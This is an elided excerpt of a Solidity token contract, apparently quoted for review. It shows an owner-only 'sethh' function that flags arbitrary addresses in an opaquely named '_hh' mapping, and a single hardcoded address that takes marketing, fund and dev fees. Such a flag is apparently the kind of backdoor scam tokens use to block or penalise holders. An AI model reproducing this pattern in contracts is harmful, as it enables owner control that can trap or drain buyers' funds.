...
abstract contract Token is IERC20, Ownable {
    ...
    mapping(address => bool) public _hh;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0xAD281FC23576D21E13286438B84323065e150455;//   营销
    ...
    function sethh(address addr, bool enable) external onlyOwner {
        _hh[addr] = enable;
    }
...
contract fbtoken is Token {
    constructor() Token(
        ...
        address(0xAD281FC23576D21E13286438B84323065e150455),//fund address
    
        address(0xAD281FC23576D21E13286438B84323065e150455)//dev address
    ){
